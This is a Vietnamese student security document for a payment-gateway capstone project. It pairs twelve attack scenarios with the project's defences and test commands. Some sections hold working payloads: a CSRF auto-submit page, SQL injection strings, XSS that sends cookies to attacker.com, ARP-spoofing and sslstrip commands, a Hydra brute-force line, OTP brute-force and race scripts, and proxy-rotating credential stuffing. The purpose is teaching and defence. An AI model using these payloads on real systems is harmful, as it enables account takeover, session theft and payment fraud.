# Kịch Bản Tấn Công & Phòng Thủ - Payment Gateway

> **Mục đích**: Tài liệu này mô tả các kịch bản tấn công phổ biến đối với Payment Gateway và cách hệ thống phòng thủ. Dùng cho mục đích giáo dục, testing và demo đồ án.

## 📋 Mục Lục
1. [CSRF (Cross-Site Request Forgery)](#1-csrf-cross-site-request-forgery)
2. [SQL Injection](#2-sql-injection)
3. [XSS (Cross-Site Scripting)](#3-xss-cross-site-scripting)
4. [Session Hijacking & Cookie Theft](#4-session-hijacking--cookie-theft)
5. [Man-in-the-Middle (MITM)](#5-man-in-the-middle-mitm)
6. [Brute Force Login](#6-brute-force-login)
7. [Card Testing & Carding](#7-card-testing--carding)
8. [Replay Attack](#8-replay-attack)
9. [Rate Limiting Bypass](#9-rate-limiting-bypass)
10. [OTP Bypass](#10-otp-bypass)
11. [Payment Amount Tampering](#11-payment-amount-tampering)
12. [Credential Stuffing](#12-credential-stuffing)

---

## 1. CSRF (Cross-Site Request Forgery)

### 🎯 Mục tiêu
Kẻ tấn công lừa nạn nhân thực hiện hành động không mong muốn (thanh toán, chuyển tiền) khi đã đăng nhập.

### 🔴 Cách tấn công

**Kịch bản:**
```html
<!-- Evil website: attacker.com -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://secureshop.kesug.com:8000/payment_service/create_payment" method="POST">
    <input type="hidden" name="payment_token" value="tok_fake">
    <input type="hidden" name="order_id" value="ORD123">
    <input type="hidden" name="amount" value="999999">
  </form>
</body>
</html>
```

**Bước thực hiện:**
1. Nạn nhân đăng nhập vào `secureshop.kesug.com`
2. Nạn nhân mở tab mới, truy cập `attacker.com`
3. Form tự động submit với cookie session của nạn nhân
4. Thanh toán được thực hiện mà nạn nhân không biết

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Double-Submit Cookie Pattern**: 
  - `backend/utils/csrf.py` - Generate CSRF token
  - `backend/middleware/csrf.py` - Global CSRF middleware
  - Token trong cookie phải khớp token trong form/header

**Files liên quan:**
```
backend/utils/csrf.py
backend/middleware/csrf.py
backend/services/user_service/user.py (login, register)
frontend/templates/login.html (hidden csrf_token field)
frontend/templates/checkout.html (X-CSRF-Token header)
```

**Test:**
```bash
# 1. Login để lấy csrf_token cookie
curl -c cookies.txt https://secureshop.kesug.com:8000/user_service/login

# 2. Thử POST mà không có CSRF token
curl -b cookies.txt -X POST https://secureshop.kesug.com:8000/user_service/login \
  -d "username=test&password=test"
# Expected: 403 CSRF validation failed

# 3. Thử với CSRF token sai
curl -b cookies.txt -X POST https://secureshop.kesug.com:8000/user_service/login \
  -d "username=test&password=test&csrf_token=fake_token"
# Expected: 403 CSRF validation failed
```

---

## 2. SQL Injection

### 🎯 Mục tiêu
Inject SQL code để truy cập/sửa đổi database, bypass authentication, exfiltrate data.

### 🔴 Cách tấn công

**Kịch bản 1: Login bypass**
```python
# Payload trong username field
username: admin' OR '1'='1' --
password: anything

# Query mong đợi kẻ tấn công:
SELECT * FROM users WHERE email='admin' OR '1'='1' --' AND password='...'
# --> Always true, bypass login
```

**Kịch bản 2: Data extraction**
```python
# Payload trong search/filter
product_name: ' UNION SELECT email, password FROM users --

# Kết quả: leak toàn bộ user credentials
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **ORM (SQLAlchemy)**: Tự động parameterized queries
- **No raw SQL**: Không dùng `.execute(f"SELECT * FROM users WHERE id={user_input}")`
- **Input validation**: Hash + encrypt sensitive fields

**Files liên quan:**
```python
# backend/services/user_service/user.py
# ✅ SAFE - Sử dụng ORM
user = db.query(User).filter(User.email == email_hash).first()

# ❌ UNSAFE - Tránh cách này
# user = db.execute(f"SELECT * FROM users WHERE email='{email}'")
```

**Test:**
```bash
# Thử inject SQL trong login
curl -X POST https://secureshop.kesug.com:8000/user_service/login \
  -d "username=admin' OR '1'='1' --&password=test&csrf_token=..."
# Expected: Login failed (không thể bypass vì ORM đã escape)
```

---

## 3. XSS (Cross-Site Scripting)

### 🎯 Mục tiêu
Inject JavaScript code vào trang web để steal cookies, redirect, phishing.

### 🔴 Cách tấn công

**Kịch bản 1: Stored XSS**
```html
<!-- Đăng ký với tên chứa script -->
Name: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

<!-- Khi admin xem danh sách users, script chạy và gửi cookie về attacker -->
```

**Kịch bản 2: Reflected XSS**
```
https://secureshop.kesug.com:8000/search?q=<script>alert(document.cookie)</script>
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Jinja2 Auto-escaping**: Template tự động escape HTML
- **Content-Security-Policy**: Chặn inline scripts
- **HttpOnly Cookies**: JavaScript không đọc được `access_token` cookie

**Files liên quan:**
```python
# backend/services/user_service/user.py
# Cookie với httponly=True
response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,  # ✅ Không thể đọc bằng JavaScript
    secure=secure_cookie,
    samesite="lax",
)
```

**Test:**
```bash
# 1. Đăng ký với payload XSS
curl -X POST https://secureshop.kesug.com:8000/user_service/register \
  -d "name=<script>alert('XSS')</script>&email=test@test.com&..."

# 2. Xem profile page
# Expected: Hiển thị &lt;script&gt;alert('XSS')&lt;/script&gt; (escaped)

# 3. Thử đọc access_token cookie
# Console: document.cookie
# Expected: Không thấy access_token (httponly)
```

---

## 4. Session Hijacking & Cookie Theft

### 🎯 Mục tiêu
Đánh cắp session cookie để impersonate nạn nhân.

### 🔴 Cách tấn công

**Kịch bản 1: XSS + Cookie theft**
```javascript
// Nếu cookie không httponly
fetch('https://attacker.com/steal?cookie=' + document.cookie);
```

**Kịch bản 2: Network sniffing (nếu không HTTPS)**
```bash
# Wireshark/tcpdump bắt HTTP traffic
tcpdump -i wlan0 -A | grep "Cookie: access_token"
```

**Kịch bản 3: Session fixation**
```
1. Attacker tạo session: GET /login → Set-Cookie: session_id=ATTACKER_SESSION
2. Lừa victim click: https://secureshop.kesug.com/login?session_id=ATTACKER_SESSION
3. Victim login với session của attacker
4. Attacker dùng ATTACKER_SESSION để truy cập
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **HttpOnly + Secure cookies**: Không đọc được bằng JS, chỉ gửi qua HTTPS
- **SameSite=Lax**: Chặn CSRF cross-origin
- **CSRF token rotation**: Token mới sau mỗi login
- **TLS/HTTPS**: Mã hóa traffic

**Files liên quan:**
```python
# backend/services/user_service/user.py
response.set_cookie(
    key="access_token",
    httponly=True,     # ✅ Chống XSS
    secure=True,       # ✅ Chỉ gửi qua HTTPS
    samesite="lax",    # ✅ Chống CSRF
)

# Rotate CSRF after login
new_csrf = csrf.generate_csrf_token()
csrf.set_csrf_cookie(response, request, new_csrf)
```

**Test:**
```bash
# 1. Login và lấy cookie
curl -c cookies.txt https://secureshop.kesug.com:8000/user_service/login -d "..."

# 2. Thử dùng cookie từ HTTP connection
curl -b cookies.txt http://secureshop.kesug.com:8000/payment_service/create_payment
# Expected: Fail (secure cookie không gửi qua HTTP)

# 3. Thử đọc cookie bằng JS trong browser console
document.cookie
# Expected: Không thấy access_token (httponly)
```

---

## 5. Man-in-the-Middle (MITM)

### 🎯 Mục tiêu
Chặn/sửa đổi traffic giữa client và server, steal credentials/payment data.

### 🔴 Cách tấn công

**Kịch bản: ARP Spoofing + SSL Strip**
```bash
# 1. ARP spoofing (giả mạo router)
arpspoof -i wlan0 -t victim_ip gateway_ip

# 2. SSL Strip (downgrade HTTPS → HTTP)
sslstrip -l 8080

# 3. Forward traffic
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# 4. Sniff credentials
tcpdump -i wlan0 -A | grep "password"
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **TLS/HTTPS**: Mã hóa toàn bộ traffic
- **HSTS Header**: Force HTTPS, chặn downgrade attack
- **Certificate Pinning** (optional): Chỉ chấp nhận cert cụ thể

**Files liên quan:**
```nginx
# deploy/nginx/conf.d/payment_gateway.conf
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# TLS 1.2+ only
ssl_protocols TLSv1.2 TLSv1.3;
```

**Test:**
```bash
# 1. Thử truy cập HTTP
curl http://secureshop.kesug.com:8000/user_service/login
# Expected: 301 redirect to HTTPS

# 2. Check HSTS header
curl -I https://secureshop.kesug.com:8000/
# Expected: Strict-Transport-Security header present

# 3. Thử dùng TLS 1.0 (cũ, không an toàn)
openssl s_client -connect secureshop.kesug.com:8000 -tls1
# Expected: Handshake failure
```

---

## 6. Brute Force Login

### 🎯 Mục tiêu
Thử hàng nghìn password để đoán đúng credentials.

### 🔴 Cách tấn công

**Kịch bản: Dictionary attack**
```bash
# Sử dụng tool như Hydra
hydra -l admin@email.com -P /usr/share/wordlists/rockyou.txt \
  https-post-form "//secureshop.kesug.com:8000/user_service/login:username=^USER^&password=^PASS^:S=welcome"

# Hoặc script Python
for password in password_list:
    response = requests.post(
        'https://secureshop.kesug.com:8000/user_service/login',
        data={'username': 'admin@email.com', 'password': password}
    )
    if 'welcome' in response.text:
        print(f"Found: {password}")
        break
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Rate Limiting**: Giới hạn số request/IP
- **Account Lockout**: Khóa tài khoản sau N lần thất bại
- **CAPTCHA**: Yêu cầu human verification
- **bcrypt**: Password hash chậm (expensive)

**Files liên quan:**
```python
# backend/middleware/rate_limiter.py
class RateLimitMiddleware:
    def __init__(self, requests_per_minute=60):
        self.max_requests = requests_per_minute
        
# backend/utils/crypto.py
pwd_context = CryptContext(schemes=["bcrypt_sha256"], deprecated="auto")
# bcrypt tốn ~100-300ms mỗi hash → chậm brute force
```

**Test:**
```bash
# Thử gửi 100 requests trong 1 phút
for i in {1..100}; do
  curl -X POST https://secureshop.kesug.com:8000/user_service/login \
    -d "username=test&password=wrong$i&csrf_token=..."
done
# Expected: Sau 60 requests → 429 Too Many Requests
```

---

## 7. Card Testing & Carding

### 🎯 Mục tiêu
Test danh sách card number đánh cắp để tìm card còn valid.

### 🔴 Cách tấn công

**Kịch bản: Card validation attack (mô tả ở mức khái niệm)**

Kẻ tấn công cố gắng gửi nhiều yêu cầu thanh toán/tokenization để “phân loại” thẻ hợp lệ/không hợp lệ dựa trên phản hồi.

Lưu ý:
- Không cung cấp/khuyến khích kịch bản tự động hóa thử thẻ.
- Chỉ kiểm thử trên môi trường bạn sở hữu/được phép, và chỉ dùng test cards/test keys.

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Fraud Detection ML**: Score suspicious transactions
- **Rate Limiting**: Giới hạn số thanh toán/IP/user
- **Velocity Checks**: Alert nếu nhiều card từ 1 IP
- **3D Secure**: Yêu cầu OTP cho high-risk transactions

**Files liên quan:**
```python
# backend/services/payment_service/security/fraud_detection.py
class FraudDetector:
    def predict(self, transaction_features):
        # ML model score risk 0-100
        risk_score = self.model.predict(features)
        
        if risk_score > 80:
            return "REJECT"
        elif risk_score > 50:
            return "REQUIRE_3DS"  # OTP
        else:
            return "APPROVE"
```

**Test:**
```bash
# Defensive testing (authorized): xác minh hệ thống chặn hành vi card-testing
# Expected:
# - Rate limit trả 429 sau ngưỡng
# - Fraud detection/velocity checks tăng risk
# - Yêu cầu OTP/3DS cho giao dịch rủi ro
# - Error message không leak quá chi tiết (tránh oracle “thẻ đúng/sai”)
```

---

## 8. Replay Attack

### 🎯 Mục tiêu
Capture request hợp lệ và replay để thực hiện lại transaction.

### 🔴 Cách tấn công

**Kịch bản: Payment replay**
```bash
# 1. Capture valid payment request
POST /payment_service/create_payment
Authorization: Bearer valid_token
{
  "payment_token": "tok_valid123",
  "order_id": "ORD001",
  "amount": 100,
  "nonce": "abc123",
  "otp": "123456"
}

# 2. Replay lại request sau 1 phút
# Expected (nếu không có phòng thủ): Charge 2 lần
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Nonce**: One-time random value, check duplicate
- **Timestamp**: Reject requests quá cũ
- **Idempotency Key**: Same key = same result
- **OTP**: Mỗi OTP chỉ dùng 1 lần

**Files liên quan:**
```python
# backend/services/payment_service/payment.py
@router.post("/create_payment")
async def create_payment(
    nonce: str = Form(...),  # ✅ Must be unique
    otp: str = Form(...),    # ✅ Verify and invalidate
):
    # Check nonce uniqueness
    if redis.exists(f"nonce:{nonce}"):
        return {"error": "Duplicate request"}
    
    redis.setex(f"nonce:{nonce}", 300, "1")  # 5 min TTL
    
    # Verify OTP (one-time use)
    if not otp_service.verify_otp(email, order_id, otp):
        return {"error": "Invalid OTP"}
    # OTP auto-deleted after verification
```

**Test:**
```bash
# 1. Gửi payment request hợp lệ
RESPONSE=$(curl -X POST https://secureshop.kesug.com:8000/payment_service/create_payment \
  -d "nonce=$(uuidgen)&otp=123456&...")

# 2. Capture nonce và replay lại
curl -X POST https://secureshop.kesug.com:8000/payment_service/create_payment \
  -d "nonce=SAME_NONCE&otp=123456&..."
# Expected: Error - Duplicate nonce OR OTP already used
```

---

## 9. Rate Limiting Bypass

### 🎯 Mục tiêu
Bypass rate limiting để thực hiện brute force/DDoS.

### 🔴 Cách tấn công

**Kịch bản 1: IP rotation**
```python
# Sử dụng proxy pool để rotate IP
proxies = ['1.1.1.1:8080', '2.2.2.2:8080', ...]

for proxy in proxies:
    response = requests.post(
        'https://secureshop.kesug.com:8000/user_service/login',
        proxies={'https': proxy},
        data={'username': 'admin', 'password': 'attempt123'}
    )
```

**Kịch bản 2: Distributed attack (botnet)**
```
1000 bots → Mỗi bot gửi 50 requests
Total: 50,000 requests từ 1000 IPs khác nhau
```

**Kịch bản 3: X-Forwarded-For spoofing**
```bash
# Giả mạo IP source
curl https://secureshop.kesug.com:8000/user_service/login \
  -H "X-Forwarded-For: 192.168.1.100" \
  -d "username=admin&password=test"
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Multi-layer rate limiting**: Per IP + per user + per endpoint
- **Trust proxy headers carefully**: Validate X-Forwarded-For
- **CAPTCHA after threshold**: Human verification
- **Behavioral analysis**: Detect bot patterns

**Files liên quan:**
```python
# backend/middleware/rate_limiter.py
class RateLimitMiddleware:
    def __init__(self, requests_per_minute=60):
        self.rate_limits = {
            '/user_service/login': 10,        # Strict
            '/payment_service/create_payment': 5,  # Very strict
            '/order_service/orders': 60       # Normal
        }
```

**Test:**
```bash
# Test 1: Exceed IP rate limit
for i in {1..100}; do curl https://secureshop.kesug.com:8000/user_service/login; done
# Expected: 429 after 10 requests

# Test 2: Try X-Forwarded-For spoofing
for i in {1..100}; do
  curl https://secureshop.kesug.com:8000/user_service/login \
    -H "X-Forwarded-For: 1.2.3.$i"
done
# Expected: Still rate limited (middleware validates real IP)
```

---

## 10. OTP Bypass

### 🎯 Mục tiêu
Bypass OTP verification để thực hiện payment mà không cần OTP.

### 🔴 Cách tấn công

**Kịch bản 1: Brute force OTP**
```python
# OTP thường 6 số → 1,000,000 combinations
for otp in range(0, 999999):
    response = requests.post(
        'https://secureshop.kesug.com:8000/payment_service/verify_otp',
        data={'email': 'victim@email.com', 'otp': f'{otp:06d}'}
    )
    if response.status_code == 200:
        print(f"OTP found: {otp:06d}")
        break
```

**Kịch bản 2: Race condition**
```bash
# Gửi 100 requests đồng thời với cùng OTP
parallel -j 100 curl -X POST https://secureshop.kesug.com:8000/payment_service/verify_otp \
  -d "otp=123456&email=victim@email.com" ::: {1..100}

# Hy vọng 1 request pass trước khi OTP bị invalidate
```

**Kịch bản 3: Social engineering**
```
Attacker gọi điện: "Xin chào, tôi là nhân viên SecureShop. 
Có giao dịch đáng ngờ từ tài khoản của bạn. 
Vui lòng cho tôi mã OTP vừa nhận để verify."
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Rate limiting**: Max 3 attempts per OTP
- **Time expiry**: OTP hết hạn sau 5 phút
- **One-time use**: OTP xóa sau verify thành công
- **Account lockout**: Khóa sau N lần sai OTP

**Files liên quan:**
```python
# backend/services/payment_service/otp_service.py
class OTPService:
    def verify_otp(self, email, order_id, submitted_otp):
        key = f"otp:{email}:{order_id}"
        stored = redis.get(key)
        
        if not stored:
            return False  # Expired or not exist
        
        attempts_key = f"otp_attempts:{email}:{order_id}"
        attempts = int(redis.get(attempts_key) or 0)
        
        if attempts >= 3:
            return False  # Too many attempts
        
        if submitted_otp == stored:
            redis.delete(key)  # ✅ One-time use
            redis.delete(attempts_key)
            return True
        else:
            redis.incr(attempts_key)
            redis.expire(attempts_key, 300)
            return False
```

**Test:**
```bash
# 1. Request OTP
curl -X POST https://secureshop.kesug.com:8000/payment_service/request_otp \
  -d "email=test@test.com&order_id=ORD001"

# 2. Thử brute force (3 attempts)
for i in {1..10}; do
  curl -X POST https://secureshop.kesug.com:8000/payment_service/verify_otp \
    -d "email=test@test.com&otp=00000$i"
done
# Expected: Blocked after 3 attempts

# 3. Thử reuse OTP sau verify thành công
# Expected: OTP already used
```

---

## 11. Payment Amount Tampering

### 🎯 Mục tiêu
Sửa đổi giá trị thanh toán trong request để trả ít tiền hơn.

### 🔴 Cách tấn công

**Kịch bản 1: Client-side tampering**
```javascript
// Browser DevTools: Edit hidden field before submit
document.querySelector('input[name="amount"]').value = 1;  // $0.01 instead of $100

// Submit form
document.getElementById('payment-form').submit();
```

**Kịch bản 2: Intercept and modify (Burp Suite)**
```http
POST /payment_service/create_payment HTTP/1.1
Host: secureshop.kesug.com:8000

order_id=ORD001&amount=100&signature=abc123...

# Modify to:
order_id=ORD001&amount=1&signature=abc123...
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Server-side validation**: Never trust client amount
- **HMAC signature**: Verify order integrity
- **Database cross-check**: Compare with stored order

**Files liên quan:**
```python
# backend/services/payment_service/payment.py
@router.post("/create_payment")
async def create_payment(
    order_id: str = Form(...),
    checkout_sig: str = Form(...),  # HMAC signature
):
    # ✅ Lấy amount từ database, không tin client
    order = _get_order_by_id(order_id)
    order_amount = int(order.get("amount"))
    
    # ✅ Verify HMAC để chắc order_id không bị đổi
    if not _verify_checkout_context_sig(
        checkout_sig, order_id, order_amount, order_currency
    ):
        return {"error": "Invalid checkout context"}
    
    # Charge với amount từ server
    stripe.PaymentIntent.create(amount=order_amount)
```

**Test:**
```bash
# 1. Tạo order $100
ORDER_ID=$(curl -X POST https://secureshop.kesug.com:8000/order_service/ \
  -d "amount=100&..." | jq -r '.order_id')

# 2. Thử checkout với amount=1 (tampered)
curl -X POST https://secureshop.kesug.com:8000/payment_service/create_payment \
  -d "order_id=$ORDER_ID&amount=1&..."
# Expected: Server sử dụng amount=$100 từ database, ignore client amount

# 3. Thử modify order_id trong checkout_sig
curl -X POST https://secureshop.kesug.com:8000/payment_service/checkout/$ORDER_ID
# Copy checkout_sig
curl -X POST https://secureshop.kesug.com:8000/payment_service/create_payment \
  -d "order_id=FAKE_ID&checkout_sig=COPIED_SIG&..."
# Expected: HMAC verification failed
```

---

## 12. Credential Stuffing

### 🎯 Mục tiêu
Sử dụng username/password từ data breach khác để thử login.

### 🔴 Cách tấn công

**Kịch bản: Automated credential stuffing**
```python
# Credentials from LinkedIn breach
leaked_credentials = [
    ("john@email.com", "password123"),
    ("jane@email.com", "summer2020"),
    # ... 500 million credentials
]

# Thử từng cặp với rate limit evasion
for email, password in leaked_credentials:
    # Rotate IP, User-Agent, timing
    response = requests.post(
        'https://secureshop.kesug.com:8000/user_service/login',
        data={'username': email, 'password': password},
        proxies=get_random_proxy(),
        headers={'User-Agent': get_random_ua()}
    )
    
    if 'welcome' in response.text:
        print(f"Compromised: {email}:{password}")
```

### 🛡️ Phòng thủ trong hệ thống

**Implementation:**
- **Rate limiting**: Strict limit trên login endpoint
- **CAPTCHA**: Sau 3 lần thất bại
- **Account monitoring**: Alert user về login từ IP mới
- **Password requirements**: Force strong passwords
- **2FA/MFA**: Thêm layer xác thực

**Files liên quan:**
```python
# backend/services/user_service/user.py
# ✅ Log failed attempts
log_security_event(
    event_type='login_failed',
    user_id=user_db.id,
    ip_address=request.client.host,
    details={'reason': 'invalid_password'}
)

# backend/middleware/rate_limiter.py
# ✅ Strict rate limit cho login
rate_limits = {
    '/user_service/login': 10,  # Max 10 attempts/minute
}
```

**Test:**
```bash
# Simulate credential stuffing
for cred in creds.txt; do
  IFS=':' read -r email password <<< "$cred"
  curl -X POST https://secureshop.kesug.com:8000/user_service/login \
    -d "username=$email&password=$password&csrf_token=..." \
    --limit-rate 10/s
done
# Expected: Rate limited + account lockout after threshold
```

---

## 📊 Attack Vector Summary

| Attack Type | Severity | Defense Mechanism | Test File |
|------------|----------|-------------------|-----------|
| CSRF | 🔴 High | Double-submit cookie, token rotation | `backend/middleware/csrf.py` |
| SQL Injection | 🔴 Critical | ORM, parameterized queries | `backend/services/*/` |
| XSS | 🟡 Medium | Auto-escaping, HttpOnly cookies, CSP | Templates, cookie settings |
| Session Hijacking | 🔴 High | Secure+HttpOnly+SameSite cookies | `backend/services/user_service/user.py` |
| MITM | 🔴 Critical | TLS/HTTPS, HSTS | `deploy/nginx/conf.d/` |
| Brute Force | 🟡 Medium | Rate limiting, bcrypt, account lockout | `backend/middleware/rate_limiter.py` |
| Card Testing | 🔴 High | Fraud ML, velocity checks, 3DS | `backend/services/payment_service/security/fraud_detection.py` |
| Replay Attack | 🟡 Medium | Nonce, timestamp, OTP one-time use | `backend/services/payment_service/payment.py` |
| Rate Limit Bypass | 🟡 Medium | Multi-layer limiting, bot detection | `backend/middleware/rate_limiter.py` |
| OTP Bypass | 🔴 High | Attempt limit, expiry, one-time use | `backend/services/payment_service/otp_service.py` |
| Amount Tampering | 🔴 Critical | Server-side validation, HMAC | `backend/services/payment_service/payment.py` |
| Credential Stuffing | 🟡 Medium | Rate limiting, CAPTCHA, 2FA | `backend/services/user_service/user.py` |

---

## 🧪 Security Testing Checklist

### Pre-Demo Setup
```bash
# 1. Verify HTTPS
curl -I https://secureshop.kesug.com:8000/
# Check: HSTS header, 301 redirect from HTTP

# 2. Check CSRF protection
curl https://secureshop.kesug.com:8000/user_service/login
# Check: csrf_token in HTML + cookie

# 3. Verify rate limiting
for i in {1..100}; do curl https://secureshop.kesug.com:8000/user_service/login; done
# Check: 429 after threshold

# 4. Test OTP flow
# a. Request OTP
# b. Verify correct OTP
# c. Try reuse → should fail
# d. Try brute force → should block after 3 attempts

# 5. Verify session security
# Login → Check cookies → HttpOnly, Secure, SameSite

# 6. Test fraud detection
# Submit payment with suspicious patterns → should require 3DS/OTP
```

### Demo Script Example

```python
# demo_attacks.py
import requests

def demo_csrf_protection():
    """Demonstrate CSRF protection"""
    print("🔴 ATTACK: CSRF without token")
    response = requests.post(
        'https://secureshop.kesug.com:8000/user_service/login',
        data={'username': 'test', 'password': 'test'}
    )
    assert response.status_code == 403
    print("✅ BLOCKED: CSRF validation failed\n")

def demo_sql_injection():
    """Demonstrate SQL injection protection"""
    print("🔴 ATTACK: SQL Injection")
    response = requests.post(
        'https://secureshop.kesug.com:8000/user_service/login',
        data={
            'username': "admin' OR '1'='1' --",
            'password': 'anything',
            'csrf_token': get_csrf_token()
        }
    )
    assert 'invalid' in response.text.lower()
    print("✅ BLOCKED: ORM prevents SQL injection\n")

def demo_rate_limiting():
    """Demonstrate rate limiting"""
    print("🔴 ATTACK: Brute force login")
    for i in range(20):
        response = requests.post(
            'https://secureshop.kesug.com:8000/user_service/login',
            data={'username': 'admin', 'password': f'pass{i}', 'csrf_token': '...'}
        )
        if response.status_code == 429:
            print(f"✅ BLOCKED: Rate limited after {i+1} attempts\n")
            break

if __name__ == "__main__":
    demo_csrf_protection()
    demo_sql_injection()
    demo_rate_limiting()
```

---

## 📚 References & Tools

### Security Testing Tools
- **OWASP ZAP**: Web vulnerability scanner
- **Burp Suite**: Intercept/modify HTTP requests
- **SQLMap**: Automated SQL injection
- **Hydra**: Brute force tool
- **Wireshark**: Network packet analysis

### Documentation
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PCI DSS Requirements](https://www.pcisecuritystandards.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Stripe Security Best Practices](https://stripe.com/docs/security/guide)

---

## ⚠️ Disclaimer

**CHỈ SỬ DỤNG CHO MỤC ĐÍCH GIÁO DỤC VÀ TESTING HỆ THỐNG CỦA BẠN.**

Việc thực hiện các cuộc tấn công vào hệ thống không có sự cho phép là **BẤT HỢP PHÁP** và có thể dẫn đến hậu quả pháp lý nghiêm trọng.

Tài liệu này được tạo ra để:
- ✅ Hiểu cách hệ thống bảo mật hoạt động
- ✅ Demo các tính năng security cho đồ án
- ✅ Pentesting hệ thống của chính mình
- ❌ KHÔNG để tấn công hệ thống của người khác

**Luôn tuân thủ:**
- Responsible disclosure nếu phát hiện lỗ hổng
- Testing chỉ trên môi trường dev/staging
- Xin phép trước khi pentesting production

---

*Document created for NT219 Capstone Project - Secure Payment Gateway*  
*Last updated: December 2025*
